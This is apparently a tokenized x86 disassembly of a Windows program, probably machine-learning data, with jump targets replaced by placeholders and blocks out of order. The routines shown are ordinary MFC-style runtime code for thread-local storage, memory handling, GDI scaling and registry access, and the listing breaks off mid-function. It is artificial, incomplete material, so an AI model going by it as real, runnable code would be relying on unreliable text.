mov [ edi ] cl
inc edi
inc esi
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
cmp al 0x5a
jg r-xdata
movsx eax al
sub eax 0x31
cmp [ esi ] 0x0
je r-xdata
cmp al 0x5a
jg r-xdata
movsx eax al
sub eax 0x31
cmp al 0x39
jle r-xdata
inc ebx
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + eax * 4 ]
test eax eax
je r-xdata
cmp al 0x39
jle r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + eax * 4 ]
test eax eax
je r-xdata
mov [ edi ] 0x3f
inc edi
jmp r-xdata
movsx eax al
sub eax 0x38
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
push eax
call [ lstrlenA@IAT ]
add ebx eax
jmp r-xdata
movsx eax al
sub eax 0x38
jmp r-xdata
push eax
push edi
call [ lstrcpyA@IAT ]
push edi
call [ lstrlenA@IAT ]
add edi eax
jmp r-xdata
inc edi
inc edi
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc esi
inc esi
cmp eax [ ebp + 0x14 ]
jl r-xdata
sub_4221cc
push esi
mov esi [ GetVersion@IAT ]
push edi
call esi
mov edi 0x80000000
test edi eax
je r-xdata
call esi
test edi eax
jne r-xdata
call esi
cmp ax 0x4
je r-xdata
and [ rw-data ] 0x0
call esi
cmp ax 0x3
jne r-xdata
push r--data
call [ RegisterWindowMessageA@IAT ]
mov [ rw-data ] eax
jmp r-xdata
pop edi
pop esi
retn
sub_422232
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ rw-data ]
push [ esi + 0x8 ]
call [ GetMapMode@IAT ]
mov edi eax
cmp edi 0x7
jge r-xdata
mov edi [ GetDeviceCaps@IAT ]
push 0x58
push [ esi + 0x8 ]
call edi
push 0x5a
mov ebx eax
push [ esi + 0x8 ]
call edi
jmp r-xdata
cmp edi 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ MulDiv@IAT ]
push ebx
mov ebx 0x9ec
push ebx
mov [ ebp - 0x4 ] eax
push [ esi ]
call edi
push [ ebp - 0x4 ]
mov [ esi ] eax
push ebx
push [ esi + 0x4 ]
call edi
mov [ esi + 0x4 ] eax
mov eax [ esi ]
push 0x3
mov ecx esi
call [ eax + 0x34 ]
push [ ebp + 0x8 ]
mov ecx esi
call sub_420f57
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_4222c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
test esi esi
je r-xdata
mov edi [ rw-data ]
mov eax [ rw-data ]
push [ esi + 0x8 ]
call [ GetMapMode@IAT ]
mov edi eax
cmp edi 0x7
jge r-xdata
mov ebx [ GetDeviceCaps@IAT ]
push 0x58
push [ esi + 0x8 ]
call ebx
push 0x5a
mov edi eax
push [ esi + 0x8 ]
call ebx
jmp r-xdata
cmp edi 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
mov ebx 0x9ec
push ebx
push edi
push [ esi ]
mov edi [ MulDiv@IAT ]
mov [ ebp - 0x4 ] eax
call edi
push ebx
mov [ esi ] eax
push [ ebp - 0x4 ]
push [ esi + 0x4 ]
call edi
mov [ esi + 0x4 ] eax
mov eax [ esi ]
push 0x3
mov ecx esi
call [ eax + 0x34 ]
push [ ebp + 0x8 ]
mov ecx esi
call sub_420eee
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_422372
mov eax sub_425c90
call sub_40cc20
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_4226cc
xor edi edi
mov [ esi ] r--data
cmp [ ebp + 0x8 ] edi
mov [ ebp - 0x4 ] edi
je r-xdata
mov [ esi + 0x78 ] edi
push [ ebp + 0x8 ]
call sub_40cc3f
pop ecx
mov [ esi + 0x78 ] eax
jmp r-xdata
call sub_422d64
mov ebx eax
push sub_42267f
lea ecx [ ebx + 0x1070 ]
call sub_423575
mov [ eax + 0x4 ] esi
call [ GetCurrentThread@IAT ]
mov [ esi + 0x28 ] eax
call [ GetCurrentThreadId@IAT ]
mov ecx [ ebp - 0xc ]
mov [ esi + 0x2c ] eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x68 ] edi
mov [ esi + 0x8c ] edi
mov [ esi + 0x90 ] edi
mov [ esi + 0x7c ] edi
mov [ esi + 0x88 ] edi
mov [ esi + 0xa8 ] edi
mov [ esi + 0x80 ] edi
mov [ esi + 0xb2 ] di
mov [ esi + 0xb0 ] di
mov [ esi + 0x70 ] edi
mov [ esi + 0xac ] edi
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0x94 ] edi
mov [ esi + 0x98 ] edi
mov [ esi + 0xb4 ] edi
mov [ esi + 0xbc ] edi
mov [ esi + 0x84 ] edi
mov [ esi + 0xb8 ] 0x200
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_422478
mov edx [ rw-data ]
test edx edx
je r-xdata
mov ecx [ ecx + 0x80 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0x80 ] 0x0
lea eax [ ecx + 0x80 ]
jne r-xdata
and [ rw-data ] 0x0
mov eax [ ecx ]
push 0x0
call [ eax + 0xc ]
jmp r-xdata
and [ rw-data ] 0x0
mov [ eax ] edx
push 0x1
pop eax
retn
sub_4224bc
mov eax sub_425ca4
call sub_40cc20
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x80 ]
xor ebx ebx
cmp ecx ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov ecx [ esi + 0xa8 ]
cmp ecx ebx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
call sub_422d64
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x14 ]
mov eax [ esi + 0x94 ]
cmp eax ebx
je r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
je r-xdata
mov eax [ esi + 0x98 ]
cmp eax ebx
je r-xdata
push eax
call sub_42141c
mov ecx [ rw-data ]
cmp ecx ebx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov [ rw-data ] ebx
mov ax [ esi + 0xb0 ]
push edi
mov edi [ GlobalDeleteAtom@IAT ]
cmp ax bx
je r-xdata
push eax
call sub_42141c
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov [ rw-data ] ebx
mov ax [ esi + 0xb2 ]
cmp ax bx
je r-xdata
push eax
call edi
mov ecx [ esi + 0xac ]
pop edi
cmp ecx ebx
je r-xdata
push eax
call edi
call sub_422d64
mov ecx [ eax + 0x10 ]
cmp ecx [ esi + 0x78 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp [ eax + 0x4 ] esi
jne r-xdata
mov [ eax + 0x10 ] ebx
push [ esi + 0x78 ]
call sub_40c218
push [ esi + 0x7c ]
call sub_40c218
push [ esi + 0x88 ]
call sub_40c218
push [ esi + 0x8c ]
call sub_40c218
push [ esi + 0x90 ]
call sub_40c218
or [ ebp - 0x4 ] 0xffffffff
add esp 0x14
mov ecx esi
mov [ esi + 0x28 ] ebx
call sub_425a30
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov [ eax + 0x4 ] ebx
sub_4225f2
push esi
mov esi ecx
mov ecx [ esi + 0xa8 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0xb4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
call [ eax + 0x10 ]
pop esi
retn
push eax
push r--data
push r--data
mov ecx esi
call sub_421ca1
sub_422622
push esi
mov esi ecx
mov eax [ esi + 0xac ]
test eax eax
je r-xdata
call sub_422d64
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x10 ] 0x5
je r-xdata
mov eax [ esi + 0xbc ]
test eax eax
je r-xdata
mov ecx esi
call sub_4225f2
mov eax [ esi + 0x38 ]
pop esi
retn
call eax
sub_42267f
mov eax sub_425cb9
call sub_40cc20
push ecx
push 0x3c
call sub_423143
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_422c5b
sub_4226cc
mov eax sub_425ce0
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_41b33b
xor eax eax
mov ecx esi
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x4c ] eax
mov [ esi + 0x50 ] eax
call sub_422709
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_422709
push esi
mov esi ecx
push edi
xor edi edi
lea eax [ esi + 0x5c ]
mov [ esi + 0x1c ] edi
push eax
mov [ esi + 0x20 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x64 ] edi
call [ GetCursorPos@IAT ]
mov [ esi + 0x58 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x24 ] 0x1
pop edi
pop esi
retn
sub_422741
mov eax sub_425d09
call sub_40cc20
push ecx
push 0x118
call sub_423143
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_422a8c
sub_4227d5
push ebp
mov ebp esp
sub esp 0x90
push ebx
push esi
push edi
call [ GetMenuCheckMarkDimensions@IAT ]
movsx ebx ax
shr eax 0x10
movsx ecx ax
cmp ebx 0x20
mov [ ebp - 0xc ] ecx
jle r-xdata
lea eax [ ebx - 0x4 ]
lea esi [ ebx + 0xf ]
cdq
sub eax edx
sar esi 0x4
mov edi eax
mov eax esi
sar edi 0x1
shl eax 0x4
add edi eax
sub edi ebx
cmp edi 0xc
jle r-xdata
push 0x20
pop ebx
push 0x20
pop eax
cmp ecx eax
jle r-xdata
push 0xc
pop edi
push 0x80
lea eax [ ebp - 0x90 ]
push 0xff
push eax
call sub_40cc70
mov eax [ ebp - 0xc ]
add esp 0xc
add eax 0xfffffffa
mov [ ebp - 0x4 ] r--data
sar eax 0x1
imul eax esi
add esi esi
mov [ ebp - 0x8 ] 0x5
lea edx [ ebp + eax * 2 - 0x90 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx edi
movzx ax [ eax ]
shl eax cl
inc [ ebp - 0x4 ]
xor ecx ecx
not eax
mov cl ah
mov [ edx + 0x1 ] al
mov [ edx ] cl
add edx esi
dec [ ebp - 0x8 ]
jne r-xdata
lea eax [ ebp - 0x90 ]
push eax
push 0x1
push 0x1
push [ ebp - 0xc ]
push ebx
call [ CreateBitmap@IAT ]
pop edi
pop esi
test eax eax
mov [ rw-data ] eax
pop ebx
jne r-xdata
leave
retn
push 0x7fe3
push eax
call [ LoadBitmapA@IAT ]
mov [ rw-data ] eax
sub_4228c1
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
je r-xdata
push sub_422775
mov ecx rw-data
call sub_42360a
mov esi eax
cmp [ esi + 0x4 ] edi
jne r-xdata
push 0x1
pop eax
jmp r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov [ esi + 0xc ] sub_416ed0
mov [ esi + 0x10 ] sub_416f40
mov [ esi + 0x14 ] sub_417000
mov [ esi + 0x18 ] sub_417180
mov [ esi + 0x1c ] sub_417620
mov [ esi + 0x20 ] sub_417520
mov [ esi + 0x24 ] sub_417900
mov [ esi + 0x28 ] sub_417220
mov [ esi + 0x2c ] sub_417360
call sub_422d64
push [ eax + 0x8 ]
call [ esi + 0xc ]
test eax eax
jne r-xdata
pop edi
pop esi
retn
call sub_422d64
push [ eax + 0x8 ]
call [ esi + 0x14 ]
xor eax eax
jmp r-xdata
mov [ esi + 0x4 ] 0x1
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
sub_422978
mov eax sub_425f49
call sub_40cc20
push ecx
push 0x3c
call sub_41b806
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_41c7aa
sub_4229b0
mov eax sub_425f5e
call sub_40cc20
push ecx
push esi
mov ecx rw-data
call sub_40b6ce
mov esi eax
mov [ ebp - 0x10 ] esi
xor eax eax
cmp esi eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov ecx esi
call sub_41c7aa
mov [ esi ] r--data
mov eax esi
sub_422a5b
mov eax sub_425f71
call sub_40cc20
push ecx
push 0x10
call sub_423143
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_42234e
sub_422abe
mov eax sub_425f84
call sub_40cc20
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0xcc ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xcc ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x30 ]
mov edi [ UnhookWindowsHookEx@IAT ]
test eax eax
je r-xdata
mov eax [ ecx ]
call [ eax + 0x58 ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
push eax
call edi
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push esi
call sub_40c218
pop ecx
sub_422b63
mov eax ecx
xor edx edx
lea ecx [ eax + 0x103c ]
mov [ eax + 0x1c ] edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
mov [ eax + 0x28 ] edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] edx
or [ eax + 0x104c ] 0xffffffff
lea ecx [ eax + 0x1048 ]
mov [ ecx + 0x8 ] edx
mov [ ecx + 0x1c ] edx
mov [ ecx + 0x20 ] edx
mov cl [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x28 ] 0x1c
mov [ eax + 0x20 ] 0x14
mov [ eax + 0x18 ] edx
mov [ eax + 0x14 ] cl
mov [ eax + 0x30 ] 0x1
mov [ eax + 0x1040 ] 0x18
retn 0x4
sub_422be1
mov eax sub_425fa6
call sub_40cc20
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x1044 ]
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
mov ecx [ esi + 0x106c ]
lea edi [ esi + 0x106c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x1070 ]
call sub_4235ec
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
lea edx [ esi + 0x1048 ]
push edx
call [ eax + 0xc ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_422c95
mov eax sub_425fb8
call sub_40cc20
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push 0x1
test ecx ecx
pop ebx
je r-xdata
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x30 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0xc ] 0x0
je r-xdata
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
call sub_41a83d
push eax
call sub_41b82f
pop ecx
mov ecx [ esi + 0x38 ]
jmp r-xdata
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
sub_422da1
push esi
mov esi ecx
lea eax [ esi + 0x20 ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ esi + 0x1c ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ esi + 0x8 ] 0x0
sub_422dd6
push esi
push 0x1074
call sub_423143
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push 0x1
mov ecx esi
call sub_422b63
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_422fae
push esi
mov ecx rw-data
call sub_40b6ce
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
retn
mov ecx esi
call sub_420a0e
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_4230fd
mov edx [ ecx ]
test edx edx
jne r-xdata
push esi
mov esi [ esp + 0x8 ]
xor eax eax
cmp edx esi
jne r-xdata
xor eax eax
jmp r-xdata
test edx edx
je r-xdata
mov eax [ ecx + 0x4 ]
mov eax [ eax + esi ]
mov [ ecx ] eax
jmp r-xdata
retn 0x4
pop esi
mov ecx [ ecx + 0x4 ]
push edi
push 0x1
pop eax
test edx edx
pop edi
je r-xdata
mov edx edi
test edx edx
jne r-xdata
mov eax [ ecx + esi ]
mov [ ecx + edx ] eax
mov edi [ ecx + edx ]
cmp edi esi
je r-xdata
sub_423175
push esi
mov esi ecx
xor eax eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x18 ] 0x4
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x1
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ esi ] eax
jne r-xdata
lea eax [ esi + 0x1c ]
push eax
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn
call sub_41a429
sub_4231b7
push esi
mov esi ecx
push edi
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call [ TlsFree@IAT ]
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edi [ eax + 0x4 ]
push 0x0
push eax
mov ecx esi
call sub_423483
test edi edi
mov eax edi
jne r-xdata
add esi 0x1c
push esi
call [ DeleteCriticalSection@IAT ]
pop edi
pop esi
retn
push eax
call [ GlobalHandle@IAT ]
mov edi eax
push edi
call [ GlobalUnlock@IAT ]
push edi
call [ GlobalFree@IAT ]
sub_42320e
push ecx
push ecx
push ebp
push esi
mov esi ecx
push edi
lea eax [ esi + 0x1c ]
push eax
mov [ esp + 0x14 ] eax
call [ EnterCriticalSection@IAT ]
mov ebp [ esi + 0x4 ]
mov edi [ esi + 0x8 ]
cmp edi ebp
jge r-xdata
push 0x1
pop edi
cmp ebp edi
jle r-xdata
mov eax [ esi + 0x10 ]
test [ eax + edi * 8 ] 0x1
je r-xdata
mov eax [ esi + 0x10 ]
add ebp 0x20
test eax eax
push ebx
jne r-xdata
mov eax [ esi + 0x10 ]
add eax 0x8
cmp edi [ esi + 0xc ]
jl r-xdata
push eax
call [ GlobalHandle@IAT ]
mov ebx eax
push ebx
call [ GlobalUnlock@IAT ]
mov eax ebp
push 0x2002
shl eax 0x3
push eax
push ebx
call [ GlobalReAlloc@IAT ]
mov eax ebp
shl eax 0x3
push eax
push 0x2002
call [ GlobalAlloc@IAT ]
jmp r-xdata
cmp edi ebp
jl r-xdata
inc edi
add eax 0x8
cmp edi ebp
jl r-xdata
mov eax [ esi + 0x10 ]
or [ eax + edi * 8 ] 0x1
push [ esp + 0x10 ]
lea eax [ eax + edi * 8 ]
lea eax [ edi + 0x1 ]
mov [ esi + 0x8 ] eax
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
pop ebp
pop ecx
pop ecx
retn
lea eax [ edi + 0x1 ]
mov [ esi + 0xc ] eax
push [ esp + 0x10 ]
call ebx
mov ebx eax
mov eax [ esi + 0x4 ]
mov ecx eax
imul ecx ecx 0x1fffffff
add ecx ebp
lea eax [ ebx + eax * 8 ]
shl ecx 0x3
push ecx
push 0x0
push eax
call sub_40cc70
add esp 0xc
mov [ esi + 0x10 ] ebx
mov [ esi + 0x4 ] ebp
pop ebx
push [ esi + 0x10 ]
call [ GlobalHandle@IAT ]
push eax
call ebx
push [ esp + 0x14 ]
call [ LeaveCriticalSection@IAT ]
call sub_41a429
mov ebx [ GlobalLock@IAT ]
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
test [ eax ] 0x1
je r-xdata
sub_423320
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x1c ]
push eax
mov [ ebp - 0x4 ] eax
call [ EnterCriticalSection@IAT ]
mov esi [ edi + 0x14 ]
mov ebx [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax [ edi + 0x10 ]
push [ ebp - 0x4 ]
and [ eax + ebx * 8 ] 0xfffffffe
lea eax [ eax + ebx * 8 ]
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0x4
cmp ebx [ esi + 0x8 ]
jge r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
and [ eax + ebx * 4 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_42337d
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
push [ esi ]
call [ TlsGetValue@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x10
call sub_423143
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea ebx [ edi + 0x8 ]
cmp eax [ ebx ]
jl r-xdata
xor edi edi
mov [ eax ] r--data
mov edi eax
jmp r-xdata
mov eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ eax + edx * 4 ] ecx
pop ebx
leave
retn 0x8
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ esi + 0xc ]
push 0x2
shl ecx 0x2
push ecx
push eax
call [ LocalReAlloc@IAT ]
mov eax [ esi + 0xc ]
shl eax 0x2
push eax
push 0x0
call [ LocalAlloc@IAT ]
jmp r-xdata
and [ edi + 0x8 ] 0x0
and [ edi + 0xc ] 0x0
lea ebx [ edi + 0x8 ]
lea eax [ esi + 0x1c ]
push eax
mov [ ebp - 0x4 ] edi
call [ EnterCriticalSection@IAT ]
push edi
lea ecx [ esi + 0x14 ]
call sub_4230ea
lea eax [ esi + 0x1c ]
push eax
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
mov eax [ ebx ]
mov ecx eax
imul ecx ecx 0x3fffffff
add ecx [ esi + 0xc ]
shl ecx 0x2
push ecx
mov ecx [ edi + 0xc ]
push 0x0
lea eax [ ecx + eax * 4 ]
push eax
call sub_40cc70
mov eax [ esi + 0xc ]
add esp 0xc
mov [ ebx ] eax
push edi
push [ esi ]
call [ TlsSetValue@IAT ]
call sub_41a429
test eax eax
mov [ edi + 0xc ] eax
jne r-xdata
mov eax [ edi + 0xc ]
test eax eax
jne r-xdata
sub_423483
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x1
mov ebx ecx
pop edi
cmp [ esi + 0x8 ] edi
mov [ ebp - 0x4 ] edi
jle r-xdata
lea edi [ ebx + 0x1c ]
push edi
call [ EnterCriticalSection@IAT ]
push esi
lea ecx [ ebx + 0x14 ]
call sub_4230fd
push edi
call [ LeaveCriticalSection@IAT ]
push [ esi + 0xc ]
call [ LocalFree@IAT ]
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
push 0x0
push [ ebx ]
call [ TlsSetValue@IAT ]
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
mov eax [ esi + 0xc ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
mov ecx [ ebx + 0x10 ]
cmp [ ecx + edi * 8 + 0x4 ] eax
je r-xdata
mov eax [ esi + 0xc ]
and [ eax + edi * 4 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax [ esi + 0xc ]
cmp [ eax + edi * 4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
inc edi
cmp edi [ esi + 0x8 ]
jl r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_42351c
push ebx
push esi
mov esi ecx
lea ebx [ esi + 0x1c ]
push ebx
call [ EnterCriticalSection@IAT ]
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push [ esi ]
call [ TlsGetValue@IAT ]
test eax eax
je r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
pop esi
pop ebx
retn 0x8
push edi
push [ esp + 0xc ]
mov ecx esi
push eax
call sub_423483
jmp r-xdata
push [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov ecx esi
push eax
call sub_423483
test edi edi
mov eax edi
jne r-xdata
pop edi
sub_423575
push esi
push edi
mov edi ecx
cmp [ edi ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov esi [ edi ]
push [ eax ]
call [ TlsGetValue@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
xor esi esi
cmp esi [ eax + 0x8 ]
jge r-xdata
call sub_42320e
mov [ edi ] eax
mov ecx rw-data
mov eax ecx
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
call [ esp + 0xc ]
mov ecx [ rw-data ]
mov esi eax
push esi
push [ edi ]
call sub_42337d
mov eax [ eax + 0xc ]
mov esi [ eax + esi * 4 ]
jmp r-xdata
xor ecx ecx
call sub_423175
mov ecx eax
jmp r-xdata
test esi esi
jne r-xdata
mov [ rw-data ] ecx
sub_4235ec
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi ] 0x0
pop esi
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push eax
call sub_423320
sub_42360a
mov eax sub_4260dc
call sub_40cc20
push ecx
push ecx
push ebx
push esi
push edi
mov esi ecx
xor edi edi
mov [ ebp - 0x10 ] esp
cmp [ esi ] edi
jne r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
push 0x10
call sub_4238a9
mov [ ebp - 0x4 ] edi
cmp [ esi ] edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x10
call sub_423919
call [ ebp + 0x8 ]
mov [ esi ] eax
sub_423655
push 0x10
call sub_423919
xor edi edi
push edi
push edi
call sub_40da39
push ebp
mov ebp esp
push ecx
cmp [ ecx ] 0x0
je r-xdata
leave
retn
mov eax [ ecx ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_4236cc
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
mov esi 0x2001f
xor edi edi
push eax
push esi
push edi
mov ebx ecx
push r--data
push 0x80000001
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] edi
mov esi [ RegCloseKey@IAT ]
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push edi
push esi
push edi
push edi
push edi
push [ ebx + 0x7c ]
